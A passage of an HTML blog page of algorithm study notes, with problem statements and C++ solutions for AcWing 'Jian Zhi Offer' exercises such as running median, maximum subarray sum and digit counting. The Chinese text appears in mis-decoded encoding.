†max-heapç»´æŠ¤è¾ƒå°çš„æ•°">é¢˜è§£ ç”¨ä¸€ä¸ªå°æ ¹å †min_heapç»´æŠ¤è¾ƒå¤§çš„æ•°, ç”¨ä¸€ä¸ªå¤§æ ¹å †max_heapç»´æŠ¤è¾ƒå°çš„æ•°</h3><p>é‚£ä¹ˆä¸­ä½æ•°å°±å¯ä»¥ç”¨å¤§å°æ ¹å †çš„æ ¹èŠ‚ç‚¹è¿›è¡Œè¡¨ç¤º</p><p>insert()æ’å…¥ä¸€ä¸ªæ–°å€¼æ—¶:</p><ol><li>å…ˆæ”¾å…¥å¤§æ ¹å †max_heapä¸­</li><li>å¦‚æœmax_heapçš„æ ¹ &gt; min_heapçš„æ ¹, åˆ™è¿›è¡Œäº¤æ¢</li><li>å¦‚æœmax_heapçš„æ•°é‡æ¯”min_heapæ•°é‡å¤§1ä»¥ä¸Š, åˆ™å°†max_heapçš„é˜Ÿå¤´æ”¾å…¥min_heapä¸­</li></ol><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221219175158742.png" alt></p><blockquote><p>è¿”å›çš„æ˜¯double, åˆ‡å‹¿ç”¨ç§»ä½æ¥æ±‚å¹³å‡ï¼Œè€Œæ˜¯åº”å½“ç”¨<code>/ 2.0</code></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; min_heap;  <span class="comment">// å°æ ¹å †</span></span><br><span class="line">  priority_queue&lt;<span class="type">int</span>&gt; max_heap;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> num)</span></span>&#123;</span><br><span class="line">    max_heap.<span class="built_in">push</span>(num);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (min_heap.<span class="built_in">size</span>() &amp;&amp; max_heap.<span class="built_in">top</span>() &gt; min_heap.<span class="built_in">top</span>()) &#123;</span><br><span class="line">      <span class="keyword">auto</span> maxv = max_heap.<span class="built_in">top</span>(), minv = min_heap.<span class="built_in">top</span>();</span><br><span class="line">      max_heap.<span class="built_in">pop</span>(), min_heap.<span class="built_in">pop</span>();</span><br><span class="line">      min_heap.<span class="built_in">push</span>(maxv), max_heap.<span class="built_in">push</span>(minv);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (max_heap.<span class="built_in">size</span>() - min_heap.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      min_heap.<span class="built_in">push</span>(max_heap.<span class="built_in">top</span>());</span><br><span class="line">      max_heap.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">double</span> <span class="title">getMedian</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (max_heap.<span class="built_in">size</span>() &gt; min_heap.<span class="built_in">size</span>()) <span class="keyword">return</span> max_heap.<span class="built_in">top</span>();</span><br><span class="line">    <span class="keyword">return</span> (max_heap.<span class="built_in">top</span>() + min_heap.<span class="built_in">top</span>()) / <span class="number">2.0</span>;  <span class="comment">// è¿”å›çš„æ˜¯double, å¿…ç”¨2.0, åˆ‡å‹¿ç”¨ç§»ä½</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="è¿ç»­å­æ•°ç»„çš„æœ€å¤§å’Œ"><a href="https://www.acwing.com/problem/content/50/">è¿ç»­å­æ•°ç»„çš„æœ€å¤§å’Œ</a></h2><p>è¾“å…¥ä¸€ä¸ª <strong>éç©º</strong> æ•´å‹æ•°ç»„ï¼Œæ•°ç»„é‡Œçš„æ•°å¯èƒ½ä¸ºæ­£ï¼Œä¹Ÿå¯èƒ½ä¸ºè´Ÿã€‚</p><p>æ•°ç»„ä¸­ä¸€ä¸ªæˆ–è¿ç»­çš„å¤šä¸ªæ•´æ•°ç»„æˆä¸€ä¸ªå­æ•°ç»„ã€‚</p><p>æ±‚æ‰€æœ‰å­æ•°ç»„çš„å’Œçš„æœ€å¤§å€¼ã€‚</p><p>è¦æ±‚æ—¶é—´å¤æ‚åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚<br>æ•°ç»„å†…å…ƒç´ å–å€¼èŒƒå›´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>âˆ’</mo><mn>200</mn><mo separator="true">,</mo><mn>200</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-200,200]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">âˆ’</span><span class="mord">200</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">200</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[1, -2, 3, 10, -4, 7, 2, -5]è¾“å‡ºï¼š18</code></pre><h3 id="DP">DP</h3><p>ä½¿ç”¨sè®°å½•ç´§é‚»xçš„å‰é¢çš„è¿ç»­æ•°ç»„æœ€å¤§å’Œ, é‚£ä¹ˆåˆ°xæ—¶:</p><ol><li>å¦‚æœså¤§äºç­‰äº0, ä»¥xç»“å°¾çš„è¿ç»­æ•°ç»„æœ€å¤§å’Œä¸º x + s;</li><li>å¦‚æœså°äº0, ä»¥xç»“å°¾çš„è¿ç»­æ•°ç»„æœ€å¤§å’Œä¸ºx (å‰é¢æ˜¯è´Ÿæ•°, å°±æ²¡å¿…è¦åŠ ä¸Šäº†);</li></ol><blockquote><p>å¯ä»¥ä½¿ç”¨<code>INT_MIN</code> å’Œ <code>INT_MAX</code>ä¹‹ç±»çš„ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">maxSubArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = INT_MIN, s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> (s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        s = s + x;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        s = x;</span><br><span class="line">      &#125;</span><br><span class="line">      res = <span class="built_in">max</span>(res, s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="ä»1åˆ°næ•´æ•°ä¸­1å‡ºç°çš„æ¬¡æ•°â˜…"><a href="https://www.acwing.com/problem/content/51/">ä»1åˆ°næ•´æ•°ä¸­1å‡ºç°çš„æ¬¡æ•°â˜…</a></h2><p>è¾“å…¥ä¸€ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ï¼Œæ±‚ä» <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> åˆ° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> è¿™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°çš„åè¿›åˆ¶è¡¨ç¤ºä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> å‡ºç°çš„æ¬¡æ•°ã€‚</p><p>ä¾‹å¦‚è¾“å…¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>12</mn></mrow><annotation encoding="application/x-tex">12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span></span></span></span>ï¼Œä» <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> åˆ° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>12</mn></mrow><annotation encoding="application/x-tex">12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span></span></span></span> è¿™äº›æ•´æ•°ä¸­åŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>â€œ</mtext><mn>1</mn><mtext>â€</mtext></mrow><annotation encoding="application/x-tex">â€œ1â€</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">â€œ1â€</span></span></span></span> çš„æ•°å­—æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mtext>ï¼Œ</mtext><mn>10</mn><mtext>ï¼Œ</mtext><mn>11</mn></mrow><annotation encoding="application/x-tex">1ï¼Œ10ï¼Œ11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord">10</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord">11</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>12</mn></mrow><annotation encoding="application/x-tex">12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span></span></span></span>ï¼Œå…¶ä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>â€œ</mtext><mn>1</mn><mtext>â€</mtext></mrow><annotation encoding="application/x-tex">â€œ1â€</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">â€œ1â€</span></span></span></span> ä¸€å…±å‡ºç°äº† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> æ¬¡ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le n \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š 12è¾“å‡ºï¼š 5</code></pre><h3 id="é¢˜è§£-6">é¢˜è§£</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">numberOf1Between1AndN_Solution</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>, dgt = <span class="built_in">GetDigit</span>(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = dgt - <span class="number">1</span>; ~j; j--) &#123;</span><br><span class="line">      <span class="type">int</span> p = <span class="built_in">pow</span>(<span class="number">10</span>, j);</span><br><span class="line">      <span class="comment">// ä¸èƒ½åœ¨æ­¤å‡½æ•°ä¸­é€šè¿‡ vector&lt;int&gt; numsçš„size()æ±‚dgt: æ±‚numsè¿‡ç¨‹ä¸­nä¼šè¢«å½’0</span></span><br><span class="line">      <span class="type">int</span> left = n / p / <span class="number">10</span>, right = n % p, dj = n / p % <span class="number">10</span>;</span><br><span class="line">      res += left * p;</span><br><span class="line">      <span class="keyword">if</span> (dj &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        res += p;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dj == <span class="number">1</span>) &#123;</span><br><span class="line">        res += right + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">GetDigit</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n) &#123;</span><br><span class="line">      res++;</span><br><span class="line">      n /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Week-5">Week 5</h1><h2 id="æ•°å­—åºåˆ—ä¸­æŸä¸€ä½çš„æ•°å­—â˜…"><a href="https://www.acwing.com/problem/content/52/">æ•°å­—åºåˆ—ä¸­æŸä¸€ä½çš„æ•°å­—â˜…</a></h2><p>æ•°å­—ä»¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0123456789101112131415</mn><mo>â€¦</mo></mrow><annotation encoding="application/x-tex">0123456789101112131415â€¦</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0123456789101112131415</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">â€¦</span></span></span></span> çš„æ ¼å¼åºåˆ—åŒ–åˆ°ä¸€ä¸ªå­—ç¬¦åºåˆ—ä¸­ã€‚</p><p>åœ¨è¿™ä¸ªåºåˆ—ä¸­ï¼Œç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> ä½ï¼ˆä» <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> å¼€å§‹è®¡æ•°ï¼‰æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span>ï¼Œç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>13</mn></mrow><annotation encoding="application/x-tex">13</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">13</span></span></span></span> ä½æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼Œç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>19</mn></mrow><annotation encoding="application/x-tex">19</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">19</span></span></span></span> ä½æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span>ï¼Œç­‰ç­‰ã€‚</p><p>è¯·å†™ä¸€ä¸ªå‡½æ•°æ±‚ä»»æ„ä½å¯¹åº”çš„æ•°å­—ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>â‰¤</mo></mrow><annotation encoding="application/x-tex">0 \le</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span></span></span></span> è¾“å…¥æ•°å­— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰¤</mo><mn>2147483647</mn></mrow><annotation encoding="application/x-tex">\le 2147483647</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2147483647</span></span></span></span></p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š13è¾“å‡ºï¼š1</code></pre><h3 id="é¢˜è§£-7">é¢˜è§£</h3><blockquote><p>è½¬åŒ–é—®é¢˜ï¼š<br>æ•°å­—å­—ç¬¦åºåˆ—ä¸º12345678910â€¦ï¼Œç¬¬1ä½ä¸º1 ï¼ˆå¯¹äº0ç‰¹åˆ¤ï¼Œç›´æ¥è¿”å›0ï¼‰<br>è¿™ä¸ªé—®é¢˜çš„è¿”å›ç»“æœä¸åŸé—®é¢˜ç›¸åŒï¼Œè¿™æ ·ç­‰ä»·å¤„ç†çš„å¥½å¤„æ˜¯ï¼šå¯¹äº1ä½æ•°æ¥è¯´ï¼Œå…¶ä¸ªæ•°ä¸º9ï¼Œä¸nä½æ•°çš„æƒ…å†µèƒ½ç»Ÿä¸€èµ·æ¥ï¼Œè¿™æ ·å†™å‡ºæ¥çš„ä»£ç æ›´ç®€æ´</p></blockquote><p>æ€è·¯</p><ol><li>ç¡®å®šæ˜¯iä½æ•°å­—: n - 1 * 9 - 2 * 90 - 3 * 900 â€¦</li><li>ç¡®å®šæ˜¯iä½æ•°å­—çš„ç¬¬å‡ ä¸ª, å³ç¡®å®šå…·ä½“number<br>æ¯”å¦‚ä»base=1000å¼€å§‹çš„4ä½, ç¬¬(n=4)/3ä¸Šå–æ•´=2, åˆ™number = base + [n/i] - 1 = 101 (<mark>å‘ä¸Šå–æ•´</mark>)</li><li>å±äºnumberçš„ç¬¬å‡ ä½<br>æ³¨æ„å–ä½™æ•°æ—¶, å¦‚æœn%i == 0, åˆ™åº”å½“å¯¹åº”r = iä½, æ¯”å¦‚1012çš„ç¬¬4ä½æ˜¯2 (4%4=0)</li><li>æ±‚numberçš„ç¬¬rä½æ˜¯å¤šå°‘<br>æ¯”å¦‚12345çš„r = 2ï¼Œé‚£ä¹ˆå°±éœ€è¦å°†å°æ•°ç‚¹å‘å³ç§»åŠ¨5-2=3ä½ï¼Œç„¶åé€šè¿‡<code>% 10</code>æ±‚æ­¤æ—¶ä¸ªä½æ•°æ•°å­—</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">digitAtIndex</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> dgt = <span class="number">1</span>, start = <span class="number">1</span>, count = <span class="number">9</span>; <span class="comment">// long long</span></span><br><span class="line">    <span class="keyword">while</span> (n &gt; dgt * count) &#123;  <span class="comment">// dgt * countæ‰æ˜¯dgtä½æ•°å çš„æ€»ä½æ•°</span></span><br><span class="line">      n -= dgt * count;</span><br><span class="line">      dgt++;</span><br><span class="line">      start *= <span class="number">10</span>;</span><br><span class="line">      count *= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> num = start + (n + dgt - <span class="number">1</span>) / dgt - <span class="number">1</span>; <span class="comment">// å‘ä¸Šå–æ•´æ•° + ç¬¬iä¸ªæ•°æ˜¯start + i - 1</span></span><br><span class="line">    <span class="type">int</span> r = (n % dgt)? (n % dgt): dgt;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; dgt - r; j++) num /= <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> num % <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•°â˜…"><a href="https://www.acwing.com/problem/content/54/">æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•°â˜…</a></h2><p>è¾“å…¥ä¸€ä¸ªæ­£æ•´æ•°æ•°ç»„ï¼ŒæŠŠæ•°ç»„é‡Œæ‰€æœ‰æ•°å­—æ‹¼æ¥èµ·æ¥æ’æˆä¸€ä¸ªæ•°ï¼Œæ‰“å°èƒ½æ‹¼æ¥å‡ºçš„æ‰€æœ‰æ•°å­—ä¸­æœ€å°çš„ä¸€ä¸ªã€‚</p><p>ä¾‹å¦‚è¾“å…¥æ•°ç»„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>3</mn><mo separator="true">,</mo><mn>32</mn><mo separator="true">,</mo><mn>321</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[3, 32, 321]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">32</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">321</span><span class="mclose">]</span></span></span></span>ï¼Œåˆ™æ‰“å°å‡ºè¿™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> ä¸ªæ•°å­—èƒ½æ’æˆçš„æœ€å°æ•°å­— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>321323</mn></mrow><annotation encoding="application/x-tex">321323</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">321323</span></span></span></span>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span 